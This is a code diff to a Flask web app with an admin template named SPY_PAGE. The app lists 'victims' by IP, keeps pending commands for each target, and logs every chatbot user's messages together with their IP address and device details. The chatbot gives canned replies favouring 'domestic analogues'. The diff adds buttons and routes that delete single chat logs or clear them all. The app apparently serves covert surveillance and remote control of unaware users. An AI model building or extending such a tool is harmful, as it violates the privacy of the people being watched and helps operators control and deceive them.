@@ -601,7 +601,7 @@ SPY_PAGE = """<!DOCTYPE html>
         .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }
+        .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; display: flex; align-items: center; justify-content: space-between; }
 
         .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
         .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
@@ -624,10 +624,16 @@ SPY_PAGE = """<!DOCTYPE html>
         .btn-del { background: #dc2626; margin-left: auto; }
 
         .logs-container { display: flex; flex-direction: column; gap: 10px; }
-        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; }
-        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; }
+        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; position: relative; }
+        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; margin-top: 6px; }
         .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 10px; border-radius: 8px; }
         .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 10px; border-radius: 8px; }
+        
+        .btn-clear-all { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; }
+        .btn-clear-all:hover { background: #ef4444; color: #fff; }
+        
+        .btn-del-log { background: none; border: none; color: #ef4444; font-size: 13px; cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: 0.2s; }
+        .btn-del-log:hover { background: rgba(239, 68, 68, 0.1); }
 
         @media(min-width: 768px) {
             body { padding: 24px; }
@@ -685,14 +691,22 @@ SPY_PAGE = """<!DOCTYPE html>
     {% endif %}
 </div>
 
-<div class="section-title">📜 История Чат-Логов</div>
+<div class="section-title">
+    <span>📜 История Чат-Логов</span>
+    {% if logs %}
+    <button class="btn-clear-all" onclick="clearAllLogs()"><i class="fa-solid fa-trash-can"></i> Очистить все логи</button>
+    {% endif %}
+</div>
 
 <div class="logs-container">
     {% if logs %}
         {% for l in logs %}
         <div class="log-card">
-            <div style="font-size:11px; color:#f59e0b; margin-bottom:6px; font-weight:bold;">
-                IP: {{ l.ip }} | Устройство: {{ l.device }}
+            <div style="display: flex; align-items: center; justify-content: space-between;">
+                <div style="font-size:11px; color:#f59e0b; font-weight:bold;">
+                    IP: {{ l.ip }} | Устройство: {{ l.device }}
+                </div>
+                <button class="btn-del-log" onclick="deleteLog('{{ l.id }}')" title="Удалить этот лог"><i class="fa-solid fa-xmark"></i></button>
             </div>
             <div class="chat-block">
                 <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
@@ -723,6 +737,22 @@ async function deleteVictim(ip) {
         body: JSON.stringify({ ip: ip })
     });
     location.reload();
+}
+
+async function deleteLog(logId) {
+    await fetch('/api/admin/deletelog', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: logId })
+    });
+    location.reload();
+}
+
+async function clearAllLogs() {
+    if(confirm("Точно очистить всю историю логов?")) {
+        await fetch('/api/admin/clearlogs', { method: 'POST' });
+        location.reload();
+    }
 }
 </script>
 </body>
@@ -778,6 +808,20 @@ def admin_delete():
     if target_ip in pending_commands:
         del pending_commands[target_ip]
     return jsonify({"status": "deleted"})
+
+@app.route("/api/admin/deletelog", methods=["POST"])
+def admin_delete_log():
+    data = request.json or {}
+    log_id = data.get("id")
+    global chat_logs
+    chat_logs = [l for l in chat_logs if str(l.get("id")) != str(log_id)]
+    return jsonify({"status": "ok"})
+
+@app.route("/api/admin/clearlogs", methods=["POST"])
+def admin_clear_logs():
+    global chat_logs
+    chat_logs = []
+    return jsonify({"status": "ok"})
 
 @app.route("/api/chats", methods=["GET"])
 def get_chats():
@@ -884,7 +928,9 @@ def chat_api():
             reply = "Запрос проанализирован. В текущих реалиях отечественные аналоги смотрятся гораздо перспективнее."
 
         all_chats[chat_id]["messages"].append({"user": user_msg, "bot": reply})
-        chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
+        
+        log_id = int(time.time() * 1000)
+        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
         
         trigger_sound = random.random() < 0.2
 
